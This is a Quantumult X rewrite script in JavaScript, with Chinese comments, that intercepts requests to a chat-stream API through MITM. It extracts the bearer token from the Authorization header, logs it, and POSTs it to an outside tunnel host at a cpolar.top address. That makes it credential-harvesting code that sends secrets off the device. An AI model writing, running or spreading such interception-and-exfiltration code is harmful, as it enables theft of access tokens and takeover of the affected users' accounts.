/******************************
[rewrite_local]
^https?:\/\/api-v4-generatechatstream-7hb5gcrmka-uc\.a\.run\.app url script-request-header https://raw.githubusercontent.com/chiheye/qxjs/main/chatkey.js
[mitm] 
hostname = api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app
********************************/


const targetURL = 'https://api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app/';

if ($request && $request.url.includes(targetURL)) {
    const authorizationHeader = $request.headers['authorization'] || $request.headers['Authorization'];
    
    if (authorizationHeader) {
        console.log(`Authorization Header: ${authorizationHeader}`); // 打印整个 Authorization header
        
        const bearerToken = authorizationHeader.split(' ')[1];
        
        if (bearerToken) {
            console.log(`Bearer Token: ${bearerToken}`); // 打印 Bearer Token
            
            const saveTokenRequest = {
                url: 'https://4f9f562e.r6.cpolar.top/save-token',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ token: bearerToken })
            };

            $task.fetch(saveTokenRequest).then(response => {
                console.log('Token saved response: ' + response.body); // 打印服务器响应
            }).catch(error => {
                console.log('Error saving token: ' + error); // 打印错误信息
            });
        } else {
            console.log("Bearer token not found in authorization header."); // 如果没有找到Bearer Token
        }
    } else {
        console.log("Authorization header not found."); // 如果没有找到Authorization header
    }
}

$done({});

